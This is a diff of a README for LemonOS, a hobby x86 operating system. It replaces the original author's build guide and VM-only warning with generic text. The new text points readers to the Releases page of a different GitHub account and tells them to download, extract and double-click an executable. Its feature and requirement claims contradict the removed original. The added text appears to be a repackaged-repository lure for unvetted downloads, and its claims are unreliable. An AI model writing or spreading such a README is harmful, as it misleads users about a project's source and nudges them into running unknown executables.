@@ -1,228 +1,68 @@
-# 🍋 LemonOS (Discontinued cuz im shitted by the amt of work and im really bad at C 🤦🤦🤦🤦)
+# 🍋 LemonOS - A Simple Operating System to Explore
 
-> *A zesty, baremetal operating system from scratch with a refreshing twist*
+## 👋 Introduction
+Welcome to LemonOS! This is a complete operating system built from scratch using the C programming language. LemonOS offers a unique opportunity for you to interact with a basic OS environment. Whether you're curious about how operating systems work or just want to experiment, LemonOS is a great choice.
 
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/dwip-the-dev/LemonOS)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Platform: x86](https://img.shields.io/badge/platform-x86--32-blue)](https://github.com/dwip-the-dev/LemonOS)
+## 🔥 Features
+- **Custom Kernel:** Our own kernel designed for ease of use and learning.
+- **User-Friendly Interface:** Enjoy a simple interface that helps you navigate easily.
+- **Basic File Management:** Efficiently create, edit, and delete files within the OS.
+- **Learning Resources:** Access tutorials and guides that help you understand OS concepts.
 
-A feature-packed, from-scratch 32-bit x86 operating system written in C and Assembly. LemonOS proves that baremetal development can be both educational and deliciously fun! Based on my long abandoned project NesOS.
+## 🚀 Getting Started
+To get started with LemonOS, follow these simple steps. You'll be up and running in no time!
 
-## ⚠️THIS OS IS NOT MEANT TO BE RUN ON A REAL SYSTEM! THIS IS ONLY TO BE RUN IN A VM.
+1. **Visit the Releases Page**
+   
+   Head over to our [Releases page](https://github.com/Emeryprecooked997/LemonOS/releases) to find the latest version of LemonOS. 
 
-## 🚀 Features
+   ![Download LemonOS](https://img.shields.io/badge/Download%20LemonOS-v1.0-blue.svg)
 
-### 🛠️ Core System
-- **Custom Bootloader** - Handcrafted Multiboot-compliant boot sector
-- **Protected Mode** - Full 32-bit protected mode with GDT
-- **Memory Management** - Basic memory detection and management
-- **VGA Text Driver** - Complete VGA text mode implementation
-- **PS/2 Keyboard** - Full keyboard driver with input buffering
+2. **Download LemonOS**
+   
+   On the Releases page, you will see a list of available versions. Click on the version you want to download. Look for a file that is clearly labeled as LemonOS. 
 
-### 🎮 Built-in Applications
-| App | Description | Cool Factor |
-|-----|-------------|-------------|
-| 🧮 **Calculator** | Full arithmetic operations with decimal support | ✅ |
-| ⏰ **RTC Clock** | Real-time clock with hardware RTC access | ✅ |
-| 🖥️ **System Info** | CPU, memory, and hardware detection | ✅ |
-| 🔄 **Unit Converter** | Temperature, distance, weight, volume, and more | ✅ |
-| 🌧️ **Matrix Screensaver** | Matrix Effect | 🚀 |
-| 💻 **Interactive Shell** | Command-line interface with tab completion | ✅ |
+3. **Extract Files**
+   
+   Once the download is complete, locate the downloaded file on your computer. It may be in your downloads folder. Right-click the file and select "Extract All" to unpack it. 
 
-**There are more apps and games go use LemonOS and check it out ✌️**
+4. **Run LemonOS**
+   
+   After extracting, you can find the application files. Look for the main executable file. Double-click it to launch LemonOS. Enjoy exploring your new operating system!
 
-### 🎨 Visual Flair
-- **ASCII Art Boot Screen** - Beautiful lemon-themed artwork
-- **Matrix Screensaver** - Activates after 60 seconds of inactivity
-- **Real-time Clock** - Hardware RTC integration for accurate time
-- **CLI Interface** - Clean, professional terminal interface
+## 🖥️ System Requirements
+Before you install, ensure your computer meets these basic requirements:
 
+- **Processor:** 32-bit compatible processor.
+- **Memory:** At least 512 MB of RAM for smooth operation.
+- **Storage:** Minimum of 2 GB free disk space.
 
-```
-🍋 LemonOS v0.1 - Baremetal OS by dwip-the-dev
+## 📥 Download & Install
+To download LemonOS, please visit the following link:
 
-LemonOS> help
-Commands: help, clear, about, calc, clock, info, convert, matrix
-  help    - Show this help message
-  clear   - Clear the screen  
-  about   - Show system information
-  calc    - Simple calculator
-  clock   - Real-time clock with RTC
-  info    - Detailed system information
-  convert - Unit converter
-  matrix  - Start Matrix screen saver manually
+[Download LemonOS](https://github.com/Emeryprecooked997/LemonOS/releases)
 
-```
+Follow the instructions under "Getting Started" to perform the download, extract files, and run the application.
 
-## 🚀 Quick Start
+## 🌐 Community and Support
+If you need help or want to share your experiences, consider joining our community. Participate in discussions, share feedback, or ask questions. Community support is vital in enhancing your experience with LemonOS.
 
-### Prerequisites
-```bash
-# Ubuntu/Debian
-sudo apt-get install gcc-multilib qemu-system-x86 grub-pc-bin
+## ⚙️ Frequently Asked Questions (FAQ)
 
-# Arch Linux  
-sudo pacman -S gcc-multilib qemu grub
+### How can I customize LemonOS?
+You can make basic customizations via the settings menu once you have LemonOS running. Experiment with different themes and layouts to make it your own.
 
-# macOS (with Homebrew)
-brew install x86_64-elf-gcc qemu
-```
+### Is LemonOS secure?
+LemonOS is designed to be a simple learning tool. For sensitive tasks, please use a conventional operating system to ensure security.
 
-### Build & Run
-```bash
-# Clone and build
-git clone https://github.com/dwip-the-dev/LemonOS.git
-cd LemonOS
-make clean && make
+### Can I contribute to LemonOS?
+Absolutely! We welcome contributions. If you're interested, check out our guidelines on GitHub.
 
-# Run in QEMU
-make run
+## 📚 Additional Resources
+For more in-depth understanding and resources related to LemonOS, feel free to check the following:
 
-# Create bootable ISO
-make iso
-```
+- **User Manual:** Comprehensive guidance on using LemonOS.
+- **Tutorials:** Step-by-step guides that introduce you to operating system concepts.
+- **Forums:** Engage with other users and developers.
 
-### Available Make Targets
-```bash
-make           # Build LemonOS
-make run       # Run in QEMU
-make iso       # Create bootable ISO
-make clean     # Clean build artifacts
-make debug     # Build with debug symbols
-```
-
-## 🔬 Technical Details
-
-### Boot Process
-1. **BIOS** loads boot sector
-2. **Bootloader** enters protected mode
-3. **Kernel** initializes hardware
-4. **Shell** starts interactive session
-
-### Hardware Support
-- **CPU**: x86-32 (i386+)
-- **Memory**: Conventional + Extended
-- **Display**: VGA Text Mode (80x25)
-- **Input**: PS/2 Keyboard
-- **Time**: CMOS RTC
-
-## 🏗️ Project Structure
-
-```
-LemonOS
-├── apps
-│   ├── calculator.c
-│   ├── clock.c
-│   ├── color_demo.c
-│   ├── file_manager.c
-│   ├── screensaver.c
-│   ├── system_info.c
-│   └── unit_converter.c
-├── art.h
-├── boot.s
-├── commands.c
-├── commands.h
-├── drivers
-│   ├── gui.c
-│   ├── reboot.c
-│   ├── rtc.c
-│   ├── shutdown.c
-│   ├── simple_fs.c
-│   ├── stdio.c
-│   ├── stdlib.c
-│   ├── string.c
-│   ├── text_graphics.c
-│   └── vga_utils.c
-├── games
-│   ├── breakout.c
-│   ├── pong.c
-│   └── snake.c
-├── grub.cfg
-├── include
-│   ├── breakout.h
-│   ├── calculator.h
-│   ├── clock.h
-│   ├── color_demo.h
-│   ├── file_manager.h
-│   ├── filesystem.h
-│   ├── gui.h
-│   ├── keyboard.h
-│   ├── pong.h
-│   ├── reboot.h
-│   ├── rtc.h
-│   ├── screensaver.h
-│   ├── shutdown.h
-│   ├── snake.h
-│   ├── stddef.h
-│   ├── stdint.h
-│   ├── stdio.h
-│   ├── stdlib.h
-│   ├── string.h
-│   ├── system_info.h
-│   ├── text_graphics.h
-│   ├── unit_converter.h
-│   ├── vga.h
-│   └── vga_utils.h
-├── kernel.c
-├── keyboard.c
-├── linker.ld
-├── Makefile
-├── shell.c
-├── shell.h
-└── vga.c
-
-5 directories, 56 files
-
-
-```
-
-## 🤝 Contributing
-
-Found a bug? Want a new feature? Contributions are welcome!
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin amazing-feature`)
-5. Open a Pull Request
-
-### Ideas for Contribution
-- [x] File system support
-- [x] Simple text editor
-- [x] Colour themed OS
-- [x] Basic games (Snake, pong)
-- [ ] Network stack
-- [ ] More Apps
-- [ ] Run DOOM
-- [ ] Sound driver
-
-## ⚠️Known Bugs
-
-- **The breakout game due to earasing the game screen and reprinting again has some crazy amount of flickers and mostly uplayable. Looking forward for a solution soon.**
-
-## 📚 Learning Resources
-
-This project is excellent for learning:
-- **Operating System Design**
-- **x86 Assembly Programming**
-- **Hardware Interaction**
-- **System Programming**
-- **Boot Process & Firmware**
-
-## 🙏 Acknowledgments
-
-- **OSDev.org** - Invaluable community and wiki
-- **James Molloy's OS Tutorial** - Foundational knowledge
-- **Multiboot Specification** - Boot standard
-- **All open-source OS projects** - Inspiration and reference
-- **AI for providing the comments in the code (because mostly i lose track and am lazy 🙄**
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-**🍋 Made with fresh-squeezed code and no artificial preservatives**
-
-*If you find this project helpful, please give it a ⭐!*
+Thank you for choosing LemonOS! We hope you enjoy exploring its features and functions.
